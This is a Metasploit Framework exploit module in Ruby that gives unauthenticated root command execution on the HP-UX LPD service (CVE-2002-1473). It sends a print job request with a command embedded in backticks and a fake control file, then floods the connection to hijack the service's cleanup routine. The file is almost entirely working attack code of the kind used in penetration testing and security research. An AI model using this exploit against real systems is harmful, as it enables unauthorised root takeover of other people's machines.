##
# $Id: cleanup_exec.rb 10561 2010-10-06 00:53:45Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP-UX LPD Command Execution',
			'Description'    => %q{
					This exploit abuses an unpublished vulnerability in the
				HP-UX LPD service. This flaw allows an unauthenticated
				attacker to execute arbitrary commands with the privileges
				of the root user. The LPD service is only exploitable when
				the address of the attacking system can be resolved by the
				target. This vulnerability was silently patched with the
				buffer overflow flaws addressed in HP Security Bulletin
				HPSBUX0208-213.
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision: 10561 $',
			'References'     =>
				[
					[ 'CVE', '2002-1473'],
					[ 'OSVDB', '9638'],
					[ 'URL', 'http://archives.neohapsis.com/archives/hp/2002-q3/0064.html'],

				],
			'Platform'       => [ 'unix', 'hpux' ],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'       => 200,
					'DisableNops' => true,
					'BadChars'    => "\x00\x09\x20\x2f",
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Targets'        =>
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 28 2002'
		))

		register_options(
			[
				Opt::RPORT(515)
			], self.class)
	end

	def exploit

		# The job ID is squashed down to three decimal digits
		jid = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]

		# Connect to the LPD service
		connect

		print_status("Sending our job request with embedded command string...")
		# Send the job request with the encoded command
		sock.put(
			"\x02" + rand_text_alphanumeric(3) + jid +
			"`" + payload.encoded + "`\n"
		)

		res = sock.get_once(1)
		if !(res and res[0,1] == "\x00")
			print_status("The target did not accept our job request")
			return
		end

		print_status("Sending our fake control file...")
		sock.put("\x02 32 cfA" + rand_text_alphanumeric(8) + "\n")
		res = sock.get_once(1)
		if !(res and res[0,1] == "\x00")
			print_status("The target did not accept our control file")
			return
		end

		print_status("Forcing an error and hijacking the cleanup routine...")

		begin
			sock.put(rand_text_alphanumeric(16384))
			disconnect
		rescue
		end

	end

end